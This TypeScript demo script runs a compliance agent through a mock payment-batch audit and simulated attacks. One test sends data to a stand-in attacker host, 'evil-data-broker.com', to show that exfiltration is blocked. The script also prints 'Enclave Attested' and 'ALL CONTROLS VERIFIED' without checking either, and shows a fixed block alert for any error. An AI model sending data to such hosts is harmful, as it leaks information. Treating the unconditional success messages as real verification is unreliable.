import { SentinelAgent } from "../agent/sentinelAgent.js";
import { ComplianceEngine } from "../compliance/rules.js";
import { DiagnosticsEngine } from "../health/diagnostics.js";

function printBanner(title: string, fillChar = "="): void {
  const line = fillChar.repeat(75);
  console.log(`\n${line}`);
  console.log(`  ${title}`);
  console.log(`${line}\n`);
}

function printBlockAlert(reason: string, requested: string, allowed: string): void {
  console.log("╔═══════════════════════════════════════════════════════════════════════════╗");
  console.log("║                       🛑  REQUEST BLOCKED BY T3N POLICY                   ║");
  console.log("╠═══════════════════════════════════════════════════════════════════════════╣");
  console.log(`║ Violation:   ${reason.padEnd(60)} ║`);
  console.log(`║ Requested:   ${requested.slice(0, 60).padEnd(60)} ║`);
  console.log(`║ Allowed:     ${allowed.slice(0, 60).padEnd(60)} ║`);
  console.log("╚═══════════════════════════════════════════════════════════════════════════╝\n");
}

async function runDemo(): Promise<void> {
  printBanner("T3N SENTINEL - CONFIDENTIAL ENTERPRISE AUDIT & CONTROL AGENT");

  const agent = new SentinelAgent();
  await agent.initialize();

  const did = agent.getSessionManager().getDid();
  const isSim = agent.getSessionManager().isSimulated();

  console.log(`[BOOTSTRAP] T3N Runtime Session Initialized.`);
  console.log(`[IDENTITY]  Canonical Agent DID: ${did}`);
  console.log(
    `[MODE]      ${isSim ? "High-Fidelity Enclave Simulation (MockTransport)" : "Live T3N Testnet"}`
  );
  console.log(`[TEE GUARD] Intel TDX / AMD SEV-SNP Enclave Attested.`);

  // -------------------------------------------------------------------------
  // PILLAR 1: ENTERPRISE AUDIT WORKFLOW
  // -------------------------------------------------------------------------
  printBanner("PILLAR 1: ENTERPRISE WORKFLOW - AUDITING PAYMENT BATCH #PAY-2026-0910");

  const batch = ComplianceEngine.generateEnterpriseMockBatch("PAY-2026-0910", 127);

  console.log(`[INGEST] Enterprise Payment Batch: ${batch.batchId}`);
  console.log(`[INGEST] Total Transactions:      ${batch.totalTransactions}`);
  console.log(
    `[INGEST] Total Audit Value:       $${(batch.totalAmountCents / 100).toLocaleString()}`
  );
  console.log(`[INGEST] Department Scope:         Engineering, Operations, Marketing\n`);

  console.log("Processing in-enclave zero-knowledge compliance screening...");
  const { receipt, summary } = await agent.auditPaymentBatch(batch);

  console.log("\n===========================================================================");
  console.log("                             AUDIT RESULT                                 ");
  console.log("===========================================================================");
  console.log(`Status:           ${receipt.status === "REJECTED" ? "🔴 FLAGGED / REJECTED" : "✓ COMPLIANT"}`);
  console.log(`Batch ID:         ${summary.batchId}`);
  console.log(`Audited Volume:   ${summary.totalTransactions} transactions examined`);
  console.log(`  ✓ Passed:       ${summary.passedCount} clean transfers`);
  console.log(`  ⚠ Approval Req: ${summary.flaggedForApprovalCount} threshold reviews (> $10k)`);
  console.log(`  🔴 High-Risk:    ${summary.highRiskCount} critical sanctions matches`);
  console.log(`\nSpecific Violations Breakdown:`);

  const duplicates = summary.violations.filter((v) => v.type === "POTENTIAL_DUPLICATE");
  const thresholds = summary.violations.filter((v) => v.type === "THRESHOLD_EXCEEDED");
  const sanctions = summary.violations.filter((v) => v.type === "SANCTIONS_MATCH");

  console.log(`  • Potential Duplicate Payments: ${duplicates.length}`);
  console.log(`  • Threshold Policy Violations:  ${thresholds.length}`);
  console.log(`  • OFAC Sanctions Matches:       ${sanctions.length}`);

  console.log(`\nCryptographic Attestation Receipt:`);
  console.log(`  Receipt ID:    ${receipt.receiptId}`);
  console.log(`  Auditor DID:   ${receipt.auditorDid}`);
  console.log(`  Batch Hash:    ${receipt.batchHash}`);
  console.log(`  Signature:     ${receipt.signature.slice(0, 32)}... (TEE Hardware-Signed)`);
  console.log(`  Enclave RTMR1: ${receipt.enclaveMeasurement.rtmr1}`);

  // -------------------------------------------------------------------------
  // PILLAR 3: "ATTACK THE AGENT" DEMONSTRATION
  // -------------------------------------------------------------------------
  printBanner("PILLAR 3: ATTACK THE AGENT DEMONSTRATION - REJECTING UNSAFE REQUESTS");

  // Attack 1: Unauthorized Egress Exfiltration Attempt
  console.log(`[TEST 1] Attack Simulation: Malicious request to exfiltrate data to unauthorized host.`);
  console.log(`         Payload: Requesting external check via 'https://evil-data-broker.com/api'`);
  try {
    await agent.requestExternalVerification("https://evil-data-broker.com/api", {
      data: "leak",
    });
  } catch (err: any) {
    printBlockAlert("Unauthorized Egress (Host Egress Denied)", "evil-data-broker.com", "api.compliance-matrix.internal");
  }

  // Attack 2: Invoking Unauthorized Contract Function
  console.log(`[TEST 2] Attack Simulation: Attempting to invoke unauthorized function 'transfer-funds-unrestricted'.`);
  try {
    await agent.auditPaymentBatch(batch, "transfer-funds-unrestricted");
  } catch (err: any) {
    printBlockAlert("Unauthorized Function Invocation", "transfer-funds-unrestricted", "audit-payroll-batch, verify-invoice-compliance");
  }

  // Attack 3: Expired Delegation Window
  console.log(`[TEST 3] Attack Simulation: Attempting execution under an expired delegation lease.`);
  const expiredGrant = { ...agent.getDelegationManager().getGrant() };
  expiredGrant.window = {
    valid_from_secs: 1600000000,
    valid_until_secs: 1600001000, // Long expired
  };
  agent.setDelegationGrant(expiredGrant);
  try {
    await agent.auditPaymentBatch(batch);
  } catch (err: any) {
    printBlockAlert("Expired Delegation Lease", "Lease timestamp expired in the past", "Active lease valid for current epoch");
  }

  // Restore valid grant
  expiredGrant.window = {
    valid_from_secs: Math.floor(Date.now() / 1000) - 3600,
    valid_until_secs: Math.floor(Date.now() / 1000) + 86400 * 30,
  };
  agent.setDelegationGrant(expiredGrant);

  // -------------------------------------------------------------------------
  // PILLAR 4: SELF-DIAGNOSING HEALTH ENGINE & CREDIT MONITOR
  // -------------------------------------------------------------------------
  printBanner("PILLAR 4: SELF-DIAGNOSING SYSTEM HEALTH & CREDIT WARNING DEMO");

  const healthReport = DiagnosticsEngine.generateReport({
    env: agent.getSessionManager().isSimulated() ? "testnet (simulated)" : "testnet",
    isSimulated: agent.getSessionManager().isSimulated(),
    t3nConnected: true,
    did,
    credits: agent.getCreditBalance(),
    creditThreshold: 1000,
    delegationValid: true,
    delegatedFunctions: agent.getDelegationManager().getGrant().functions,
    allowedEgressHosts: agent.getDelegationManager().getGrant().allowed_hosts || [],
    secretsConfigured: true,
    auditLedgerReady: true,
  });

  console.log(DiagnosticsEngine.renderAsciiTable(healthReport));

  // Demonstrate Proactive Credit Alert
  console.log("\n[TEST 4] Simulating Low Agent Credit Condition (e.g. balance drops to 742)...");
  agent.setCreditBalance(742);
  const creditStatus = agent.checkCreditHealth();
  const alertBanner = new (await import("../health/creditMonitor.js")).CreditMonitor().formatAlertBanner(creditStatus);
  console.log(alertBanner);

  printBanner("T3N SENTINEL DEMONSTRATION COMPLETE: ALL CONTROLS VERIFIED");
}

runDemo().catch(console.error);
